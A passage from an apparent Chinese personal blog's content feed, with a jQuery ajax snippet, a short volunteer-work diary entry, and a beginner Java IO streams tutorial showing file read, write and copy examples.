class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>        $(<span class="hljs-string">&#x27;p&#x27;</span>).<span class="hljs-title function_">html</span>(data);<br><br>     &#125;,<br>     <span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error)<br>     &#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//post()方式</span><br>$.<span class="hljs-title function_">ajax</span>(&#123;<br>   <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/index&#x27;</span>,<br>   <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<br>   <span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">12</span>&#125;,<br>   <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>      $(<span class="hljs-string">&#x27;p&#x27;</span>).<span class="hljs-title function_">html</span>(data);<br>   &#125;,<br>   <span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>社会实践</title>
    <link href="/2020/08/11/%E7%A4%BE%E4%BC%9A%E5%AE%9E%E8%B7%B5/"/>
    <url>/2020/08/11/%E7%A4%BE%E4%BC%9A%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<p>(合照找不到了🌫🌫)</p><p>将近一个月的志愿活动结束了，总结一句话“痛并快乐着”(～￣▽￣)～在不同岗位体验不一样的志愿服务，帮助更多需要帮助的人。虽然辛苦，但是就是喜欢听他们对我说谢谢(<em>^_^</em>)，五六点的时候看着拎着大包小包来去匆匆的打工人，不禁也在想“我将来到底要做什么？能做什么？会做什么？究竟想要哪种生活？”</p>]]></content>
    
    
    <categories>
      
      <category>日常随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>志愿服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---IO流</title>
    <link href="/2020/07/11/JavaSe%E5%9F%BA%E7%A1%80---IO%E6%B5%81%E8%A1%A5%E5%85%85/"/>
    <url>/2020/07/11/JavaSe%E5%9F%BA%E7%A1%80---IO%E6%B5%81%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<h3 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h3><h4 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类"></a>1.分类</h4><ul><li>（1）按照流的方向进行分类：以内存为参照物，往内存中去的叫输入(读)，从内存中出来的叫做输出(取)</li><li>（2）按读取的数据方式的不同进行分类：有的流是按字节的方式进行读取，一次读取1个字节(byte)，等同于一次读取8个2进制位，这种流是万能的，什么类型文件都能读取；有的流是按字符方式读取数据，一次读取1个字符，这种流是为了方便读取文本文件而存在，但不能读取图片，音频等，<strong>word****文件也无法读取</strong></li><li>综上所述，流的分类有：输入输出流，字符字节流</li></ul><h4 id="2-流的四大家族"><a href="#2-流的四大家族" class="headerlink" title="2.流的四大家族"></a>2.流的四大家族</h4><ul><li>Java.io.InputStream———-&gt;字节输入流</li><li>Java.io.OutputStream———-&gt;字节输出流</li><li>Java.io.Reader———-&gt;字符输入流</li><li>Java.io.Writer———-&gt;字符输出流</li><li>*<em>注意：所有的流都有</em>***close()**<strong>方法，用完流一定要关闭！！！</strong></li></ul><h4 id="3-所有的输出流都实现了："><a href="#3-所有的输出流都实现了：" class="headerlink" title="3.所有的输出流都实现了："></a>3.所有的输出流都实现了：</h4><ul><li><strong>Java.io.Flushable</strong>接口，都是可刷新的，都有**flush()*<em>方法，输出流在最终输出之后，<strong>一定要写</strong></em>*flush()<strong><strong>方法</strong></strong>,<strong><strong>表示将管道当中的输出数据强行输出完</strong>。这个方法**作用是清空管道</strong></li></ul><h4 id="4-常用流"><a href="#4-常用流" class="headerlink" title="4.常用流"></a>4.常用流</h4><ul><li>(1)文件流<ul><li>Java.io.FileInputStream</li><li>Java.io.OutputStream</li><li>Java.io.FileReader</li><li>Java.io.FileWriter</li></ul></li><li>(2)转换流(字节流—-&gt;字符流)<ul><li>Java.io.InputStreamReader</li><li>Java.io.OutputStreamWriter</li></ul></li><li>(3)缓冲流<ul><li>Java.io.BufferedReader</li><li>Java.io.BufferedWriter</li><li>Java.io.BufferedInputStream</li><li>Java.io.BufferedOutputStream</li></ul></li><li>(4)数据流<ul><li>Java.io.DataInputStream</li><li>Java.io.DataOutputStream</li></ul></li><li>(5)标准输入输出流<ul><li>Java.io.PrintWriter</li><li>Java.io.PrintStream</li></ul></li><li>(6)对象流<ul><li>Java.io.ObjectInputStream</li><li>Java.io.ObjectOutputStream</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputStreamText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>             fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\Text\\联系.txt&quot;</span>);<br><br>             <span class="hljs-comment">//读取流</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">FileData</span> <span class="hljs-operator">=</span> fis.read();<br>            System.out.println(FileData);<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>             e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (fis != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//在finally语句块儿中确保流一定关闭</span><br>                <span class="hljs-comment">//关闭条件：流不为空,如果流为空就不用关闭</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    fis.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 1.文件字节输出流</span><br><span class="hljs-comment">* 2.内存----&gt;硬盘</span><br><span class="hljs-comment">* 3.voidclose()------关闭此文件输出流并释放与此流相关联的任何系统资源。</span><br><span class="hljs-comment">* 4.protected voidfinalize()------清理与文件的连接，并确保当没有更多的引用此流时，将调用此文件输出流的 close方法。</span><br><span class="hljs-comment">* 5.FileChannelgetChannel()------返回与此文件输出流相关联的唯一的FileChannel对象。</span><br><span class="hljs-comment">* 6.FileDescriptorgetFD()------返回与此流相关联的文件描述符。</span><br><span class="hljs-comment">* 7.voidwrite(byte[] b)------将 b.length个字节从指定的字节数组写入此文件输出流。</span><br><span class="hljs-comment">* 8.voidwrite(byte[] b, int off, int len)------将 len字节从位于偏移量 off的指定字节数组写入此文件输出流。</span><br><span class="hljs-comment">* 9.voidwrite(int b)------将指定的字节写入此文件输出流。</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputStreamText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//加入true表示不更新源文件直接在源文件后面加入需要写入内容，不加true，表示需要先将源文件清空然后在重新写入新的字符</span><br>            fos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;D:\\Text\\联系.txt&quot;</span>,<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//开始写文件</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;我爱你，但是我现在需要变得更好！！！&quot;</span>;<br>            <span class="hljs-comment">//将字符串转换成byte数组</span><br>            <span class="hljs-type">byte</span>[] byt = s.getBytes();<br>            fos.write(byt);<br>            <span class="hljs-comment">//输出流必须加入刷新</span><br>            fos.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (fos != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fos.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BufferReaderText02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//文件字节输入流 ----&gt; 使用缓冲流(BufferReader) ----&gt; 转换为文件字符输入流</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-comment">/*  //这是个字节流</span><br><span class="hljs-comment">            fileInputStream = new FileInputStream(&quot;D:\\Text\\联系.txt&quot;);</span><br><span class="hljs-comment">            //这是转换流</span><br><span class="hljs-comment">            InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);</span><br><span class="hljs-comment">            //这是个字符流</span><br><span class="hljs-comment">            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);*/</span><br><br>            <span class="hljs-comment">//合并写法</span><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;D:\\\\Text\\\\联系.txt&quot;</span>)));<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">while</span> ((s1 = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                System.out.println(s1);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (fileInputStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//关闭流</span><br>                    fileInputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BufferWriterText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//文件字节输出流 ----&gt; 使用缓冲流(BufferReader) ----&gt; 转换为文件字符输出流</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;D:\\Text\\java01.text&quot;</span>,<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(fileOutputStream);<br>            <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bufferedWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(outputStream);<br>            bufferedWriter.write(<span class="hljs-string">&quot;HEllo,world\n&quot;</span>);<br>            bufferedWriter.write(<span class="hljs-string">&quot;Number N0.1\n&quot;</span>);<br><br>            bufferedWriter.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (fileOutputStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fileOutputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//单个文件拷贝</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IoCopyText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fio</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//创建一个输入流对象</span><br>            fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;C:\\Users\\11026\\Desktop\\1611539565799.docx&quot;</span>);<br>            <span class="hljs-comment">//创建一个输出流对象</span><br>            fio = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;D:\\Text\\1611539565799.docx&quot;</span>);<br><br>            <span class="hljs-comment">//一边读一边写</span><br>            <span class="hljs-type">byte</span>[] byt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>]; <span class="hljs-comment">//一次最多拷贝1MB</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>((count = fis.read(byt)) != -<span class="hljs-number">1</span>)&#123;<br>                fio.write(byt,<span class="hljs-number">0</span>,count);<br>            &#125;<br><br>            <span class="hljs-comment">//刷新，输出流最后要刷新</span><br>            fio.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (fis != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fis.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">//这里需要分开关闭，否则会影响另一个流的关闭</span><br>            <span class="hljs-keyword">if</span> (fio != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fio.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CopyText02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//创建读，写对象</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            in = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;D:\\Text\\NEWS.txt&quot;</span>);<br>            out = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;D:\\NEWS.txt&quot;</span>);<br>            <span class="hljs-comment">//边读边写</span><br>            <span class="hljs-type">char</span>[] chars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">4</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">readCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>((readCount = out.read(chars)) != -<span class="hljs-number">1</span>)&#123;<br>                in.write(chars,<span class="hljs-number">0</span>,readCount);<br>            &#125;<br>            <span class="hljs-comment">//刷新</span><br>            in.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="5-File类常用的方法"><a href="#5-File类常用的方法" class="headerlink" title="5.File类常用的方法"></a>5.File类常用的方法</h4><ul><li>1.exists()—–&gt;判断文件是否存在</li><li>2.createNewFile()——–&gt;以文件的形式创建</li><li>3.mkdir()——-&gt;以目录形式创建</li><li>4.mkdirs()——–&gt;创建多重目录</li><li>5.getParent()——-&gt;获取文件的父路径</li><li>6.getParentFile()——&gt;获取文件的绝对路径</li><li>7.getAbsolutePath()——-&gt;获取计算机任意一个文件的绝对路径</li><li>8.getName()—–&gt;获取文件名</li><li>9.isFile()—–&gt;判断是否是一个文件</li><li>10.isDirectory()——-&gt;判断是否是一个目录</li><li>11.lastModified()——-&gt;获取文件的最后修改时间</li><li>12.length()——&gt;获取文件大小(字节)</li><li>13.listFiles()———–&gt;获取当前路径下的子文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileText01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建file对象</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;D:\\Text\\java_File&quot;</span>);<br>        <span class="hljs-comment">//判断D:\java_File是否存在</span><br>        System.out.println(file.exists()); <span class="hljs-comment">//false</span><br><br>        <span class="hljs-comment">//如果不存在，则以文件形式创建</span><br>       <span class="hljs-comment">/* if(!file.exists())&#123;</span><br><span class="hljs-comment">            try &#123;</span><br><span class="hljs-comment">                file.createNewFile();</span><br><span class="hljs-comment">            &#125; catch (IOException e) &#123;</span><br><span class="hljs-comment">                e.printStackTrace();</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;*/</span><br>        <span class="hljs-comment">//如果不存在，则以目录形式创建</span><br>        <span class="hljs-keyword">if</span>(!file.exists())&#123;<br>            file.mkdir();<br>        &#125;<br>        <span class="hljs-comment">//创建多重目录</span><br>        <span class="hljs-comment">/*File file1 = new File(&quot;D:\\Text\\a\\b\\c\\d\\e\\f\\g\\h\\i&quot;);</span><br><span class="hljs-comment">        if (!file1.exists())&#123;</span><br><span class="hljs-comment">            file1.mkdirs();</span><br><span class="hljs-comment">        &#125;*/</span><br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;D:\\JAVAText\\src\\列车牵引计算\\计算牵引质量\\Mass.java&quot;</span>);<br>        <span class="hljs-comment">//获取文件的父路径</span><br>        System.out.println(<span class="hljs-string">&quot;相对路径：&quot;</span> + file1.getParent());<span class="hljs-comment">//D:\JAVAText\src\列车牵引计算\计算牵引质量</span><br>        <span class="hljs-comment">//获取文件的绝对路径</span><br>        System.out.println(<span class="hljs-string">&quot;绝对路径：&quot;</span> + file1.getParentFile());<br><br>        <span class="hljs-comment">//获取计算机任意一个文件的绝对路径</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;Mass.java&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;绝对路径为：&quot;</span> + file2.getAbsolutePath());<br><br>        <span class="hljs-comment">//获取文件名</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file3</span> <span 